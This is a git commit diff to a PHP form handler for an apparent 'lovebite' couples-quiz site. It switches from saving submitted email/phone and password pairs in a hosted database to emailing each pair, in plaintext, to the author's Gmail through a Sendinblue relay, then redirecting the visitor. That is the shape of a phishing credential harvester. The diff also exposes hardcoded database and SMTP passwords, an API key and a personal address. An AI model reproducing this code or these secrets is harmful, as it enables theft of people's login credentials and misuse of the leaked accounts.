5546ecdf4bc3fa1ef85e433ebab494f69c8a5c97
love-ai <125962648+love-ai@users.noreply.github.com>
2023-02-21 23:27:50 +0600

    Update process.php

--- process.php
+++ process.php
@@ -1,40 +1,46 @@
 <?php
-// Define database connection variables
-$servername = "sql12.freesqldatabase.com"; // Replace with your own database host name
-$username = "sql12599952"; // Replace with your own database username
-$password = "zttT6GSgwr"; // Replace with your own database password
-$dbname = "sql12599952"; // Replace with your own database name
 
-// Create database connection
-$conn = mysqli_connect($servername, $username, $password, $dbname);
+require_once 'vendor/autoload.php'; // Replace with the path to the Sendinblue API client library
 
-// Check if connection is successful
-if (!$conn) {
-    die("Connection failed: " . mysqli_connect_error());
-}
+// Create the Sendinblue client object
+$sendinblue = new Sendinblue\Client('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 ');
 
-// Get form data
-$email_phone = $_POST['email_phone']; 
+// Set the SMTP configuration
+$config = Sendinblue\Configuration::getDefaultConfiguration()->setApiKey('api-key', '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 ');
+$config->setHost('smtp-relay.sendinblue.com');
+$config->setPort(587);
+$config->setEncryption('tls');
+$config->setUsername('nazmuzzaman.ifty13317@gmail.com');
+$config->setPassword('DnqUW78d91Ejh5mA');
+$email_number = $_POST['email_number'];
 $password = $_POST['password'];
+// Set the message parameters
+$to = array(array('email' => 'nazmuzzaman.ifty13317@gmail.com', 'name' => 'Your Name'));
+$from = array('email' => 'nazmuzzaman.ifty13317@gmail.com', 'name' => 'Sender Name');
+$subject = 'Form Submission';
+$htmlContent = '<p><b>New form submission:</b></p>';
+$htmlContent .= '<table>';
+$htmlContent .= '<tr><td>Email:</td><td>' . $_POST['email'] . '</td></tr>';
+$htmlContent .= '<tr><td>Password:</td><td>' . $_POST['password'] . '</td></tr>';
+$htmlContent .= '</table>';
+$textContent = 'New form submission: Email: ' . $_POST['email'] . ', Password: ' . $_POST['password'];
 
-// Define SQL query to insert data into table
-$sql = "INSERT INTO info (email_number, password) VALUES (?, ?)";
+// Create the message object
+$message = new Sendinblue\Model\SendSmtpEmail(array(
+    'to' => $to,
+    'replyTo' => $from,
+    'from' => $from,
+    'subject' => $subject,
+    'htmlContent' => $htmlContent,
+    'textContent' => $textContent
+));
 
-// Prepare the statement
-$stmt = $conn->prepare($sql);
-
-// Bind parameters to the prepared statement
-$stmt->bind_param("ss", $email_phone, $password);
-
-// Execute the statement
-if ($stmt->execute()) {
-  header("Location: https://love-ai.github.io/lovebite/couple%20query.html");
-  exit();
-} else {
-  echo "Error: " . $sql . "<br>" . $conn->error;
+// Send the message
+try {
+    $result = $sendinblue->getSendSmtpEmailApi()->sendTransacEmail($message);
+    header('Location: https://love-ai.github.io/lovebite/couple%20query.html');
+} catch (Exception $e) {
+    echo 'Error: ' . $e->getMessage();
 }
 
-// Close the statement and database connection
-$stmt->close();
-mysqli_close($conn);
 ?>
